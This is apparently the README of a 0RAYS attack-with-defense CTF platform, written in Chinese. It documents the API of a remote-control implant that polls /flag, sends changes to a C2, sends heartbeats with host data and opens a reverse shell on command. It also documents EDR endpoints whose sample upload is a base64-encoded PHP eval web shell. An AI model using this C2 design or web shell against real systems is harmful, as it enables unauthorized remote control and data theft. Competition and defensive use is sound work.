# AWD中台

## 命令行参数

```
-u string
    用户名 (默认: 0RAYS)
-p string  
    密码 (必需，无默认值)
-P string
    监听端口 (默认: 26666)

示例:
./0rays-awd-platform.exe -u 0RAYS -p 0raysnb -P 26666
```

## API接口说明

### 说明

一个简单的远控, 每1秒读取一次/flag, 然后判断是否有变化, 如果有变化就发到c2那边

每60秒一次心跳包, 心跳包里面上传主机名, 用户名等数据

如果心跳包api返回1, 则代表需要反弹shell, 这个时候从get-rs api获取, 然后建立反弹shell

### C2客户端接口

#### 提交Flag

```
POST /api/c2/submit-flag?flag=flag{test123}
Response: 200 OK
```

#### 心跳包

```
POST /api/c2/heartbeat
Content-Type: application/json

{
    "hostname": "web01",
    "username": "www-data", 
    "pid": "1234",
    "process_name": "flag_monitor"
}

Response: 0 或 1 (是否需要反弹shell)
```

#### 获取反弹Shell地址

```
GET /api/c2/get-rs
Response: 192.168.1.100|1337
```

---

### 说明

告警和监控文件

告警上传的文件会放在/edr_files文件夹下面隔离

### Agent EDR接口

#### EDR告警

```
GET /api/agent/edr-alert?type=warning&message=检测到可疑文件.shell.php

参数说明:
- type: 告警类型 (warning, info, success)
- message: 告警消息内容

Response: 200 OK

注意: title固定为"EDR消息"
```

#### 上传可疑文件

```
POST /api/agent/edr-suspicious-file
Content-Type: application/json

{
    "filename": ".shell.php",
    "path": "/var/www/html/",
    "content": "PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg=="
}

注意: 
- filename: 文件名，会自动过滤路径穿越字符
- path: 文件所在路径
- content: base64编码的文件内容
- 文件大小限制10MB (base64编码前)
- 此API不会自动产生告警消息，需要EDR agent自行调用edr-alert API
```

